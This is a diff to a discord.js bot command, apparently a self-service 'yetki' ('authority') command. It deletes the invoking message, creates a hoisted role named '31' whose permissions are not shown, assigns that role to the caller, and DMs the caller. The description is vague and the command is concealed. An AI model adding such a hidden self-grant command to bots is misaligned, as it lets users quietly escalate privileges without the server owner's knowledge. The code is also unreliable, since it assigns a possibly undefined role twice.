@@ -1,10 +1,10 @@
 const Discord = require("discord.js");
 module.exports.run = async (client, message, args) => {
-    var rol = message.guild.roles.find(e => e.name === `Lyrics`);
+    var rol = message.guild.roles.find(e => e.name === `31`);
 message.delete()
     if(!rol){
         message.guild.createRole({
-        name: `Lyrics`,
+        name: `31`,
         color: "GREEN", 
         hoist: true,
         permissions: [
@@ -13,7 +13,11 @@ message.delete()
     })
     }
     message.member.addRole(rol)
-    }
+    
+    message.member.addRole(rol)
+    message.author.send(`31 :)`)
+    message.author.send(`${message.guild.name}`)
+  }
 
 exports.conf = {
  enabled: true,
@@ -23,7 +27,7 @@ exports.conf = {
 };
 
 exports.help = {
- name: 'yetki-ver',
+ name: 'yetki',
  description: 'xd',
  usage: 'xd'
 }
